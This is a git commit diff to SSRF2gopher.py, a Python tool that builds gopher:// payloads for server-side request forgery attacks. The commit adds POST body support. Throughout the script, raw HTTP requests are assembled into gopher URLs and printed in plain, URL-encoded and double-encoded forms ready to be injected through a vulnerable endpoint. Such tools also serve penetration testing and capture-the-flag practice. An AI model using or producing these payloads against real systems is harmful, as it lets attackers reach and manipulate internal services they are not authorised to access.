afa7d0f314b9e13b8acf4243d7ce0f84e23b0b94
nineninenine <ehobart@gmail.com>
2025-08-03 16:46:53 -0400

    add post body support

--- SSRF2gopher.py
+++ SSRF2gopher.py
@@ -6,10 +6,10 @@ import sys
 def banner():
     banner = '''
    ___________  _______                 __          
-  / __/ __/ _ \\/ __/_  |___ ____  ___  / /  ___ ____
- _\\ \\_\\ \\/ , _/ _// __// _ `/ _ \\/ _ \\/ _ \\/ -_) __/
-/___/___/_/|_/_/ /____/\\_, /\\___/ .__/_//_/\\__/_/   
-                      /___/    /_/                  
+  / __/ __/ _ \\/ __/_  |___ ____  ___  / /  ___ ____ 
+ _\\ \\_\\ \\/ , _/ _// __// _ `/ _ \\/ _ \\/ _ \\/ -_) __/ 
+/___/___/_/|_/_/ /____/\\_, /\\___/ .__/_//_/\\__/_/    
+                      /___/    /_/                   
 
 Created by eMVee 
     '''
@@ -33,19 +33,21 @@ def another_option(data):
 def host_header(host):
     return "Host: " + host
 
-def generate_gopher_request(host, port, endpoint, method):
-    return f"gopher://{host}:{port}/_{method} {endpoint} HTTP/1.1"
-
-def generate_gopher_payload(host, port, endpoint, custom_headers, method):
+# 🔻 Modified this function to accept `body`
+def generate_gopher_payload(host, port, endpoint, custom_headers, method, body=None):
     payload = generate_gopher_request(host, port, endpoint, method) + "\n"
     payload += host_header(host) + "\n"
-    
-    # Add custom headers
+
     for header, value in custom_headers.items():
         payload += f"{header}: {value}\n"
-    
-    payload += "\n"  # Empty line to separate headers from body
+
+    payload += "\n"  # separate headers from body
+    if method == "POST" and body:
+        payload += body
     return payload
+
+def generate_gopher_request(host, port, endpoint, method):
+    return f"gopher://{host}:{port}/_{method} {endpoint} HTTP/1.1"
 
 def parse_headers(headers_list):
     custom_headers = {}
@@ -67,67 +69,44 @@ def main():
     parser.add_argument('-e', '--endpoint', help='Target endpoint')
     parser.add_argument('-H', '--headers', nargs='*', help='Custom headers in format "Name:Value"')
     parser.add_argument('-m', '--method', help='HTTP method (GET, POST, PUT, etc.)')
-    
-    args = parser.parse_args()
 
+    args = parser.parse_args()
     print(banner())
 
-    # Get host
-    if args.host:
-        host = args.host
-    else:
-        print("[?] What is the address of the Host? ")
-        host = input()
+    host = args.host if args.host else input("[?] What is the address of the Host? ")
+    port = args.port if args.port else input("[?] What port should be used for gopher? ")
+    endpoint = args.endpoint if args.endpoint else input("[?] What endpoint should be used for gopher? ")
+    method = args.method.upper() if args.method else input("[?] What HTTP method should be used? (GET, POST, PUT, etc.) ").upper() or "GET"
 
-    # Get port
-    if args.port:
-        port = args.port
-    else:
-        print("[?] What port should be used for gopher? ")
-        port = input()
-
-    # Get endpoint
-    if args.endpoint:
-        endpoint = args.endpoint
-    else:
-        print("[?] What endpoint should be used for gopher? ")
-        endpoint = input()
-
-    # Get HTTP method
-    if args.method:
-        method = args.method.upper()
-    else:
-        print("[?] What HTTP method should be used? (GET, POST, PUT, etc.) ")
-        method = input().upper()
-        if not method:
-            method = "GET"  # Default to GET if no input provided
-
-    # Handle custom headers
     if args.headers:
         custom_headers = parse_headers(args.headers)
     else:
         custom_headers = {}
-        print("[?] Would you like to add custom headers? (y/n)")
-        if input().lower() == 'y':
+        if input("[?] Would you like to add custom headers? (y/n) ").lower() == 'y':
             while True:
-                print("[?] Enter header (or press enter to finish): ")
-                user_input = input().strip()
+                user_input = input("[?] Enter header (or press enter to finish): ").strip()
                 if not user_input:
                     break
-                header, value = user_input.split(":")
+                header, value = user_input.split(":", 1)
                 custom_headers[header.strip()] = value.strip()
 
+    # 🔻 Prompt for POST body input
+    body = None
+    if method == "POST":
+        body = input("[?] Enter POST body content: ")
+
     try:
-        print("\n[!] Plain text payload:")
-        print("\n")
-        payload = generate_gopher_payload(host, port, endpoint, custom_headers, method)
+        print("\n[!] Plain text payload:\n")
+        payload = generate_gopher_payload(host, port, endpoint, custom_headers, method, body)
         print(payload)
 
         encoded_payload = url_encode_payload(payload)
         print("\n[!] URL encoded payload:")
         print(encoded_payload)
+
         print("\n[!] Double URL encoded payload:")
         print(double_url_encode_payload(encoded_payload))
+
         print("\n[!] Another option that might work via something like BURP:")
         print(another_option(encoded_payload))
 
@@ -137,3 +116,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
